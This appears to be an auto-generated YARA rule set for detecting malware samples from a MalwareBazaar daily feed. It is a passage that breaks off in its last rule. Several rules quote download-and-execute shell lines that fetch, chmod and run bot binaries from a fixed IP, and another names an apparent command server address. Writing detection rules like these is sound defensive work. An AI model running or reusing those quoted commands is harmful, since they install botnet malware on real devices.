/*
   YARA Rule Set
   Author: Sameer P Sheik
   Date: 2025-01-01
   Identifier: evidences
   Reference: https://datalake.abuse.ch/malware-bazaar/daily/
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_081233aadcfa21bcbe84a12651f750b00839dcb51bc48952ddb2bd197681bf72 {
   meta:
      description = "evidences - file 081233aadcfa21bcbe84a12651f750b00839dcb51bc48952ddb2bd197681bf72.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "081233aadcfa21bcbe84a12651f750b00839dcb51bc48952ddb2bd197681bf72"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $x2 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x3 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s4 = "ReachFramework.resources.dll" fullword wide
      $s5 = "get_loader_name_from_dll" fullword ascii
      $s6 = "Update.dll" fullword ascii
      $s7 = "4C4}INSTALLFOLDERl4dPleasePleasePleaseProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProc" ascii
      $s8 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s9 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s10 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s11 = "get_loader_name" fullword ascii
      $s12 = "qgethostname" fullword ascii
      $s13 = "process_config_directive" fullword ascii
      $s14 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s15 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s16 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s17 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s18 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s19 = "ature attributesFeatureComponentsFeature_Foreign key into Feature table.Component_Foreign key into Component table.FilePrimary k" ascii
      $s20 = "vloader_failure" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 28000KB and
      1 of ($x*) and 4 of them
}

rule sig_4935378b727944223fd18d13e08795ff4f64d76331fa475b08f65c0ea287a7a5 {
   meta:
      description = "evidences - file 4935378b727944223fd18d13e08795ff4f64d76331fa475b08f65c0ea287a7a5.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "4935378b727944223fd18d13e08795ff4f64d76331fa475b08f65c0ea287a7a5"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $x3 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s4 = "ReachFramework.resources.dll" fullword wide
      $s5 = "get_loader_name_from_dll" fullword ascii
      $s6 = "Update.dll" fullword ascii
      $s7 = "4C4}INSTALLFOLDERl4dPleasePleasePleaseProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProc" ascii
      $s8 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s9 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s10 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s11 = "get_loader_name" fullword ascii
      $s12 = "qgethostname" fullword ascii
      $s13 = "process_config_directive" fullword ascii
      $s14 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s15 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s16 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s17 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s18 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s19 = "ature attributesFeatureComponentsFeature_Foreign key into Feature table.Component_Foreign key into Component table.FilePrimary k" ascii
      $s20 = "vloader_failure" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 30000KB and
      1 of ($x*) and 4 of them
}

rule sig_8157cd0933bc74f6f4274efc2883e7049c1c19267500775573a15887928ea2bc {
   meta:
      description = "evidences - file 8157cd0933bc74f6f4274efc2883e7049c1c19267500775573a15887928ea2bc.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "8157cd0933bc74f6f4274efc2883e7049c1c19267500775573a15887928ea2bc"
   strings:
      $s1 = "SWPVRQ" fullword ascii /* reversed goodware string 'QRVPWS' */
      $s2 = "RSQVWP" fullword ascii /* reversed goodware string 'PWVQSR' */
      $s3 = "PRWSVQ" fullword ascii /* reversed goodware string 'QVSWRP' */
      $s4 = "ChaCha20 for x86, CRYPTOGAMS by <appro@openssl.org>" fullword ascii
      $s5 = "8KeyZu\\" fullword ascii
      $s6 = "VVPQRWS" fullword ascii
      $s7 = "JRRWPPP" fullword ascii
      $s8 = "AQQPSWV" fullword ascii
      $s9 = "PVQWWRW" fullword ascii
      $s10 = "QWVPPRP" fullword ascii
      $s11 = "PRQSQQQW" fullword ascii
      $s12 = "PVSRSQV" fullword ascii
      $s13 = "8pagetV" fullword ascii
      $s14 = "RWRRRPh0" fullword ascii
      $s15 = "WWWPhs1" fullword ascii
      $s16 = "RWRRRPh8" fullword ascii
      $s17 = "rahctq" fullword ascii
      $s18 = "expand 32-byte k" fullword ascii /* Goodware String - occured 1 times */
      $s19 = "A(;A,t" fullword ascii /* Goodware String - occured 1 times */
      $s20 = "D$4Ph3" fullword ascii /* Goodware String - occured 1 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 21000KB and
      8 of them
}

rule sig_8e09de570ef224ab7e8c5a293256edf89b9ecd7a2f728563fe31ad7a44241921 {
   meta:
      description = "evidences - file 8e09de570ef224ab7e8c5a293256edf89b9ecd7a2f728563fe31ad7a44241921.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "8e09de570ef224ab7e8c5a293256edf89b9ecd7a2f728563fe31ad7a44241921"
   strings:
      $s1 = "rof.dll" fullword ascii
      $s2 = "i32.dll" fullword ascii
      $s3 = "l32.dll" fullword ascii
      $s4 = "_32.dll" fullword ascii
      $s5 = "SystemFuH" fullword ascii /* base64 encoded string 'K+-zan' */
      $s6 = "ntdll.dlH" fullword ascii
      $s7 = "omitempt" fullword ascii
      $s8 = "{{templaH" fullword ascii
      $s9 = "SCRIPT_NH9" fullword ascii
      $s10 = "winmm.dlH" fullword ascii
      $s11 = "8pipeu$H" fullword ascii
      $s12 = "kernel32H" fullword ascii
      $s13 = "CONTENT_" fullword ascii
      $s14 = "GetSysteH" fullword ascii
      $s15 = "content-H" fullword ascii
      $s16 = "content-H9" fullword ascii
      $s17 = "kernel32H9" fullword ascii
      $s18 = "wine_getH" fullword ascii
      $s19 = "CONTENT_H" fullword ascii
      $s20 = "WSAGetOvH" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 14000KB and
      8 of them
}

rule sig_4389b7235d2c2264b8a539c679b34c5212a0fc94e39a51ccc9f70211781340bb {
   meta:
      description = "evidences - file 4389b7235d2c2264b8a539c679b34c5212a0fc94e39a51ccc9f70211781340bb.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "4389b7235d2c2264b8a539c679b34c5212a0fc94e39a51ccc9f70211781340bb"
   strings:
      $s1 = "A0H+A8H" fullword ascii /* reversed goodware string 'H8A+H0A' */
      $s2 = "I3F0I3V8fH" fullword ascii /* base64 encoded string '#qt#u||' */
      $s3 = " JJ5Jj" fullword ascii /* reversed goodware string 'jJ5JJ ' */
      $s4 = "I3U8I3E0L" fullword ascii /* base64 encoded string '#u<#q4' */
      $s5 = "Authentif" fullword ascii
      $s6 = "-HeadersH" fullword ascii
      $s7 = "Content-E" fullword ascii
      $s8 = "/getinfoH" fullword ascii
      $s9 = "Content-H" fullword ascii
      $s10 = ", POST, H" fullword ascii
      $s11 = "TeYEH3SPH" fullword ascii
      $s12 = "/getheigH" fullword ascii
      $s13 = "\\\\?\\pipeH" fullword ascii
      $s14 = "AuthorizH" fullword ascii
      $s15 = "Poly1305 for x86_64, CRYPTOGAMS by <appro@openssl.org>" fullword ascii
      $s16 = "SHA1 multi-block transform for x86_64, CRYPTOGAMS by <appro@openssl.org>" fullword ascii
      $s17 = "AuthorizL" fullword ascii
      $s18 = "AESNI-CBC+SHA256 stitch for x86_64, CRYPTOGAMS by <appro@openssl.org>" fullword ascii
      $s19 = "User-AgeH" fullword ascii
      $s20 = "SHA256 multi-block transform for x86_64, CRYPTOGAMS by <appro@openssl.org>" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      8 of them
}

rule sig_107922ca8ec9b7cc2c71e15b4c554275bc5770931c3c7c90bccbdc837458324d {
   meta:
      description = "evidences - file 107922ca8ec9b7cc2c71e15b4c554275bc5770931c3c7c90bccbdc837458324d.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "107922ca8ec9b7cc2c71e15b4c554275bc5770931c3c7c90bccbdc837458324d"
   strings:
      $s1 = "Gping@openssh.com" fullword ascii
      $s2 = "TTTTTTy" fullword ascii /* reversed goodware string 'yTTTTTT' */
      $s3 = "myhostna" fullword ascii
      $s4 = "rctry* /b" fullword ascii
      $s5 = "\\77777" fullword ascii /* reversed goodware string '77777\\' */
      $s6 = "8Command(<" fullword ascii
      $s7 = "222222<" fullword ascii /* reversed goodware string '<222222' */
      $s8 = "R22222" fullword ascii /* reversed goodware string '22222R' */
      $s9 = "httpobx" fullword ascii
      $s10 = "\\3333\\." fullword ascii /* hex encoded string '33' */
      $s11 = "\\5555\\." fullword ascii /* hex encoded string 'UU' */
      $s12 = "\\.5678\\" fullword ascii /* hex encoded string 'Vx' */
      $s13 = "-RcXW:\\" fullword ascii
      $s14 = "\\4567\\." fullword ascii /* hex encoded string 'Eg' */
      $s15 = "\\6777\\." fullword ascii /* hex encoded string 'gw' */
      $s16 = "\\2233\\." fullword ascii /* hex encoded string '"3' */
      $s17 = "\\3334\\." fullword ascii /* hex encoded string '34' */
      $s18 = "\\2222\\." fullword ascii /* hex encoded string '""' */
      $s19 = "MsLu6PPu.TTu&T" fullword ascii
      $s20 = "CMDNGDLCG" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 17000KB and
      8 of them
}

rule sig_47a8e5c27218e4ec11d4fb2f16d993c2c84a686407d417ed023199149e465d59 {
   meta:
      description = "evidences - file 47a8e5c27218e4ec11d4fb2f16d993c2c84a686407d417ed023199149e465d59.r00"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "47a8e5c27218e4ec11d4fb2f16d993c2c84a686407d417ed023199149e465d59"
   strings:
      $s1 = "TT copt mt103.pdf.exe" fullword ascii
      $s2 = "h:\\^]G" fullword ascii
      $s3 = "\\.\\0@G" fullword ascii
      $s4 = "]%U%@_v" fullword ascii
      $s5 = "+ +,Y]" fullword ascii
      $s6 = "zzyyyx" fullword ascii
      $s7 = "srghkd" fullword ascii
      $s8 = "7\\/f* " fullword ascii
      $s9 = "ajOMQc67" fullword ascii
      $s10 = "pQbH!8" fullword ascii
      $s11 = "hwBRW6%18" fullword ascii
      $s12 = "DFdpwcL" fullword ascii
      $s13 = "aWQy6P:" fullword ascii
      $s14 = "JMUq:%B" fullword ascii
      $s15 = "GquBd!/" fullword ascii
      $s16 = "^\\Zdc`ecgljnn" fullword ascii
      $s17 = "wQTTw*VPg" fullword ascii
      $s18 = "NVbKYHz" fullword ascii
      $s19 = "SZiNQ\"" fullword ascii
      $s20 = "BIPXm!" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule sig_55ff23173fd9a290f2d8a8821bad30e41be053f755e609ca568f315a9395e6a2 {
   meta:
      description = "evidences - file 55ff23173fd9a290f2d8a8821bad30e41be053f755e609ca568f315a9395e6a2.zip"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "55ff23173fd9a290f2d8a8821bad30e41be053f755e609ca568f315a9395e6a2"
   strings:
      $s1 = "absetup42.rar" fullword ascii
      $s2 = "* ZKU7" fullword ascii
      $s3 = "},\"3?85+C" fullword ascii /* hex encoded string '8\' */
      $s4 = "Ovspy?G" fullword ascii
      $s5 = "pzsilyt" fullword ascii
      $s6 = "cwKqN!." fullword ascii
      $s7 = "zbHI* )" fullword ascii
      $s8 = " 1221.txt" fullword ascii
      $s9 = "%QmHSZU%" fullword ascii
      $s10 = "Pass$wo$rd " fullword ascii
      $s11 = "[E,q:\"" fullword ascii
      $s12 = "d_CX:\"{" fullword ascii
      $s13 = "\"& at:\"" fullword ascii
      $s14 = "CmDD )?d" fullword ascii
      $s15 = "jFh5l:\\" fullword ascii
      $s16 = "XAX.lKD" fullword ascii
      $s17 = "GET3g +d5" fullword ascii
      $s18 = "}v)G3\"SPY" fullword ascii
      $s19 = "\"#dLlY" fullword ascii
      $s20 = "+ a1Is" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 13000KB and
      8 of them
}

rule sig_67084fc5413108f6fa49ed8fd32859a141723d7e3325c8124d0d08b1795e5737 {
   meta:
      description = "evidences - file 67084fc5413108f6fa49ed8fd32859a141723d7e3325c8124d0d08b1795e5737.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "67084fc5413108f6fa49ed8fd32859a141723d7e3325c8124d0d08b1795e5737"
   strings:
      $s1 = "curl http://185.142.53.190/arc -o -> arc;chmod 777 arc;./arc selfrep.arc.curl;rm -rf arc;" fullword ascii
      $s2 = "curl http://185.142.53.190/ppc -o -> ppc;chmod 777 ppc;./ppc selfrep.ppc.curl;rm -rf ppc;" fullword ascii
      $s3 = "curl http://185.142.53.190/arm -o -> arm;chmod 777 arm;./arm selfrep.arm.curl;rm -rf arm;" fullword ascii
      $s4 = "curl http://185.142.53.190/arm7 -o -> arm7;chmod 777 arm7;./arm7 selfrep.arm7.curl;rm -rf arm7;" fullword ascii
      $s5 = "curl http://185.142.53.190/mips -o -> mips;chmod 777 mips;./mips selfrep.mips.curl;rm -rf mips;" fullword ascii
      $s6 = "curl http://185.142.53.190/mpsl -o -> mpsl;chmod 777 mpsl;./mpsl selfrep.mpsl.curl;rm -rf mpsl;" fullword ascii
      $s7 = "curl http://185.142.53.190/sh4 -o -> sh4;chmod 777 sh4;./sh4 selfrep.sh4.curl;rm -rf sh4;" fullword ascii
      $s8 = "curl http://185.142.53.190/arm5 -o -> arm5;chmod 777 arm5;./arm5 selfrep.arm5.curl;rm -rf arm5;" fullword ascii
   condition:
      uint16(0) == 0x7563 and filesize < 2KB and
      all of them
}

rule sig_7066e4a496d83ee1b677ade06c868a432bb4a0dd364b19ee184147a527b11c10 {
   meta:
      description = "evidences - file 7066e4a496d83ee1b677ade06c868a432bb4a0dd364b19ee184147a527b11c10.bat"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "7066e4a496d83ee1b677ade06c868a432bb4a0dd364b19ee184147a527b11c10"
   strings:
      $s1 = "%%headerValue%\"%" fullword ascii
      $s2 = "%%headerName%:%" fullword ascii
      $s3 = "%%url% %" fullword ascii
   condition:
      uint16(0) == 0x2540 and filesize < 10KB and
      all of them
}

rule sig_72d78d95ca7a694358b74fe50d337c12db11cca3739a0de04cf30d6e5599de62 {
   meta:
      description = "evidences - file 72d78d95ca7a694358b74fe50d337c12db11cca3739a0de04cf30d6e5599de62.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "72d78d95ca7a694358b74fe50d337c12db11cca3739a0de04cf30d6e5599de62"
   strings:
      $s1 = "/bin/busybox wget http://185.142.53.190/arm -O -> arm;chmod 777 arm;./arm selfrep.arm.wget;rm -rf arm;" fullword ascii
      $s2 = "/bin/busybox wget http://185.142.53.190/ppc -O -> ppc;chmod 777 ppc;./ppc selfrep.ppc.wget;rm -rf ppc;" fullword ascii
      $s3 = "/bin/busybox wget http://185.142.53.190/arc -O -> arc;chmod 777 arc;./arc selfrep.arc.wget;rm -rf arc;" fullword ascii
      $s4 = "/bin/busybox wget http://185.142.53.190/mips -O -> mips;chmod 777 mips;./mips selfrep.mips.wget;rm -rf mips;" fullword ascii
      $s5 = "/bin/busybox wget http://185.142.53.190/arm7 -O -> arm7;chmod 777 arm7;./arm7 selfrep.arm7.wget;rm -rf arm7;" fullword ascii
      $s6 = "/bin/busybox wget http://185.142.53.190/mpsl -O -> mpsl;chmod 777 mpsl;./mpsl selfrep.mpsl.wget;rm -rf mpsl;" fullword ascii
      $s7 = "/bin/busybox wget http://185.142.53.190/arm5 -O -> arm5;chmod 777 arm5;./arm5 selfrep.arm5.wget;rm -rf arm5;" fullword ascii
      $s8 = "/bin/busybox wget http://185.142.53.190/sh4 -O -> sh4;chmod 777 sh4;./sh4 selfrep.sh4.wget;rm -rf sh4;" fullword ascii
   condition:
      uint16(0) == 0x622f and filesize < 2KB and
      all of them
}

rule b4610a17b2b8935d83eed7e8eba49659de82f45fdd7dd4c79fbfee8cf1b4bce0 {
   meta:
      description = "evidences - file b4610a17b2b8935d83eed7e8eba49659de82f45fdd7dd4c79fbfee8cf1b4bce0.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "b4610a17b2b8935d83eed7e8eba49659de82f45fdd7dd4c79fbfee8cf1b4bce0"
   strings:
      $s1 = "tty login fail, device busy" fullword ascii
      $s2 = "download file fail: not found mount point of '%s'" fullword ascii
      $s3 = "download file: %s, size: %u" fullword ascii
      $s4 = "the program 'login' is not found" fullword ascii
      $s5 = "(\"libev: watcher has invalid priority\", (((W)w)->priority - (((0x7c) & 4) ? -2 : 0)) >= 0 && (((W)w)->priority - (((0x7c) & 4)" ascii
      $s6 = "login_path" fullword ascii
      $s7 = "exec '%s' timeout" fullword ascii
      $s8 = "(\"libev: negative ev_timer repeat value found while processing timers\", w->repeat > 0.)" fullword ascii
      $s9 = "find_login" fullword ascii
      $s10 = "(\"libev: watcher has invalid priority\", (((W)w)->priority - (((0x7c) & 4) ? -2 : 0)) >= 0 && (((W)w)->priority - (((0x7c) & 4)" ascii
      $s11 = "run_command" fullword ascii
      $s12 = "(\"libev: pipe_w not active, but pipe not written\", (0 + ((ev_watcher *)(void *)(&((loop)->pipe_w)))->active))" fullword ascii
      $s13 = "buffer_hexdump" fullword ascii
      $s14 = "/home/guoyunqi/source_rtty/target/lib:" fullword ascii
      $s15 = "      -f username              Skip a second login authentication. See man login(1) about the details" fullword ascii
      $s16 = "getspnam" fullword ascii
      $s17 = "download file fail: no enough space" fullword ascii
      $s18 = "pipe2 failed: %s" fullword ascii
      $s19 = "(\"libev: poll() returned illegal result, broken BSD kernel?\", p < ((loop)->polls) + ((loop)->pollcnt))" fullword ascii
      $s20 = "(libev) error creating signal/async pipe" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule sig_9731e300a22b902c4b728945d125681bcbb357fbaeb9097cc3073f6085a1f447 {
   meta:
      description = "evidences - file 9731e300a22b902c4b728945d125681bcbb357fbaeb9097cc3073f6085a1f447.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "9731e300a22b902c4b728945d125681bcbb357fbaeb9097cc3073f6085a1f447"
   strings:
      $s1 = "handle_command" fullword ascii
      $s2 = "__sparc_get_pc_thunk.l7" fullword ascii
      $s3 = "daemonize" fullword ascii
      $s4 = "__stack_chk_fail@GLIBC_2.4" fullword ascii
      $s5 = "threads.0" fullword ascii
      $s6 = ".note.ABI-tag" fullword ascii
      $s7 = "__thread_self" fullword ascii
      $s8 = "__FRAME_END__" fullword ascii
      $s9 = "completed.1" fullword ascii
      $s10 = "_IO_stdin_used" fullword ascii
      $s11 = "pthread_create@GLIBC_2.34" fullword ascii
      $s12 = ".note.gnu.build-id" fullword ascii
      $s13 = "89.250.72.36" fullword ascii
      $s14 = "__isoc99_sscanf@GLIBC_2.7" fullword ascii
      $s15 = "connect" fullword ascii /* Goodware String - occured 429 times */
      $s16 = "socket" fullword ascii /* Goodware String - occured 452 times */
      $s17 = "setsid@GLIBC_2.2" fullword ascii
      $s18 = "srand@GLIBC_2.2" fullword ascii
      $s19 = "__libc_start_main" fullword ascii
      $s20 = "libc.so.6" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 70KB and
      8 of them
}

rule a8f2c220a92de8965e7f54c787bcd04f74f4452742175f2e9a46834a5dc9588b {
   meta:
      description = "evidences - file a8f2c220a92de8965e7f54c787bcd04f74f4452742175f2e9a46834a5dc9588b.zip"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "a8f2c220a92de8965e7f54c787bcd04f74f4452742175f2e9a46834a5dc9588b"
   strings:
      $s1 = "RarExt.dll" fullword ascii
      $s2 = "psmachine.dll" fullword ascii
      $s3 = "psmachine_arm64.dll" fullword ascii
      $s4 = "Exlan_setup_v3.1.2.exe" fullword ascii
      $s5 = "Data/Updater.exe.config" fullword ascii
      $s6 = "fonts/TwemojiMozilla.ttf" fullword ascii
      $s7 = "`[-/]]7\\b" fullword ascii /* hex encoded string '{' */
      $s8 = "gldllld$" fullword ascii
      $s9 = ":dEVGET-" fullword ascii
      $s10 = "* *wE%" fullword ascii
      $s11 = "gaiemckg" fullword ascii
      $s12 = "wzfgcvg" fullword ascii
      $s13 = "tVbjVa- " fullword ascii
      $s14 = "Data/en-US/AppXRuntime.adml" fullword ascii
      $s15 = "y\"tKg:\"" fullword ascii
      $s16 = "Data/en-US/ActiveXInstallService.adml" fullword ascii
      $s17 = "3et.WVW" fullword ascii
      $s18 = "Q:\"`Xb" fullword ascii
      $s19 = "Data/en-US/AppCompat.adml" fullword ascii
      $s20 = "WWJ:\\4)" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 19000KB and
      8 of them
}

rule adc13d8a4d5c9fe56b994748b9b3d5722b56f6bba9fb85dc20d8e84100f294da {
   meta:
      description = "evidences - file adc13d8a4d5c9fe56b994748b9b3d5722b56f6bba9fb85dc20d8e84100f294da.zip"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "adc13d8a4d5c9fe56b994748b9b3d5722b56f6bba9fb85dc20d8e84100f294da"
   strings:
      $s1 = "tmpAE4B.HTmLPK" fullword ascii
      $s2 = "tmpAE4B.HTmL" fullword ascii
      $s3 = " -]6MS" fullword ascii
      $s4 = "2Bqs+ " fullword ascii
      $s5 = "P+j -c" fullword ascii
      $s6 = "sFhkcnoX" fullword ascii
      $s7 = "eOgqj9h" fullword ascii
      $s8 = "c.auD)" fullword ascii
      $s9 = "=EzWy+a*" fullword ascii
      $s10 = "eFcsl\\" fullword ascii
      $s11 = "hzxa[5N" fullword ascii
      $s12 = ",a.Glg" fullword ascii
      $s13 = "0MIbOO7m" fullword ascii
      $s14 = "Wnkp`h^" fullword ascii
      $s15 = "WltD^ro" fullword ascii
      $s16 = "EubJG7&c" fullword ascii
      $s17 = "oZIV|'h-" fullword ascii
      $s18 = "\\p#Mr /" fullword ascii
      $s19 = "M^nM3cB" fullword ascii
      $s20 = "5kOr&w" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 400KB and
      8 of them
}

rule b0bbd2542bc257b4494e679157edbb972ae9250e4cbe08f256fa296bea934ffb {
   meta:
      description = "evidences - file b0bbd2542bc257b4494e679157edbb972ae9250e4cbe08f256fa296bea934ffb.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "b0bbd2542bc257b4494e679157edbb972ae9250e4cbe08f256fa296bea934ffb"
   strings:
      $s1 = "drreedddd.exe" fullword ascii
      $s2 = "olbtbcr" fullword ascii
      $s3 = "q%W%HR#r" fullword ascii
      $s4 = "g.B7!." fullword ascii
      $s5 = "\\NVLO}BD" fullword ascii
      $s6 = "/!4+ u17" fullword ascii
      $s7 = "RgCu3o7" fullword ascii
      $s8 = "OGJeC\\" fullword ascii
      $s9 = "SwPw/Uu" fullword ascii
      $s10 = "'noaZ28Lg" fullword ascii
      $s11 = "OWPvUT2$VPw" fullword ascii
      $s12 = "jpfQX&q" fullword ascii
      $s13 = "EKmSC*t" fullword ascii
      $s14 = "Z.NIt`" fullword ascii
      $s15 = "fDLhX(*Q" fullword ascii
      $s16 = "bQtO4\\" fullword ascii
      $s17 = "vzer4AuautO" fullword ascii
      $s18 = "<bgpzZuW" fullword ascii
      $s19 = "Yjeg.$l/" fullword ascii
      $s20 = "rOnKoc)C" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 1000KB and
      8 of them
}

rule fa66ea0d5d2699d34a3beeaeae1b8a6ec2141a4ab8a28889d0eef407d1a997c4 {
   meta:
      description = "evidences - file fa66ea0d5d2699d34a3beeaeae1b8a6ec2141a4ab8a28889d0eef407d1a997c4.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "fa66ea0d5d2699d34a3beeaeae1b8a6ec2141a4ab8a28889d0eef407d1a997c4"
   strings:
      $s1 = "  document.getElementById(\"login_safe\").style.display=\"\";" fullword ascii
      $s2 = "<form action=/boaform/admin/formLogin method=POST name=\"cmlogin\">" fullword ascii
      $s3 = "  document.getElementById(\"login_safe\").style.display=\"none\";" fullword ascii
      $s4 = "<!--<body leftmargin= \"0\" topmargin= \"0\" scroll= \"no\" bgcolor=\"white\" style=\"background-image: url(../image/login.gif);" ascii
      $s5 = "<META http-equiv=content-script-type content=text/javascript>" fullword ascii
      $s6 = "var loginFlag = 0;" fullword ascii
      $s7 = "  loginFlag = 1;" fullword ascii
      $s8 = " if (loginFlag)" fullword ascii
      $s9 = "  || document.referrer.search(\"ppp_user_X116.asp\") != -1" fullword ascii
      $s10 = "  || document.referrer.search(\"usereg.asp\") != -1)" fullword ascii
      $s11 = "<body leftmargin=\"0\" topmargin=\"0\" bgcolor=\"#ffffff\" onLoad=\"on_init();\"><img src=\"../image/login.gif\" width=\"100%\" " ascii
      $s12 = "<body leftmargin=\"0\" topmargin=\"0\" bgcolor=\"#ffffff\" onLoad=\"on_init();\"><img src=\"../image/login.gif\" width=\"100%\" " ascii
      $s13 = "<!--<body leftmargin= \"0\" topmargin= \"0\" scroll= \"no\" bgcolor=\"white\" style=\"background-image: url(../image/login.gif);" ascii
      $s14 = "  document.getElementById(\"passwd\").style.color=\"#000000\";" fullword ascii
      $s15 = "ype=\"password\" name=\"psd\" id=\"psd\" style=\"width:150;\"/></td></tr>" fullword ascii
      $s16 = "<META http-equiv=content-type content=\"text/html; charset=utf-8\">" fullword ascii
      $s17 = "  document.getElementById(\"user\").style.color=\"#000000\";" fullword ascii
      $s18 = " if(document.referrer.search(\"wifi_X165.asp\") != -1" fullword ascii
      $s19 = "\" onclick=\"location.href='/usereg.asp';\" /-->" fullword ascii
      $s20 = "   <tr id=\"login_safe\" align=\"center\" valign=\"middle\" style=\"display:none;\">" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 20KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _081233aadcfa21bcbe84a12651f750b00839dcb51bc48952ddb2bd197681bf72_4935378b727944223fd18d13e08795ff4f64d76331fa475b08f65c0ea2_0 {
   meta:
      description = "evidences - from files 081233aadcfa21bcbe84a12651f750b00839dcb51bc48952ddb2bd197681bf72.msi, 4935378b727944223fd18d13e08795ff4f64d76331fa475b08f65c0ea287a7a5.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-01"
      hash1 = "081233aadcfa21bcbe84a12651f750b00839dcb51bc48952ddb2bd197681bf72"
      hash2 = "4935378b727944223fd18d13e08795ff4f64d76331fa475b08f65c0ea287a7a5"
   strings:
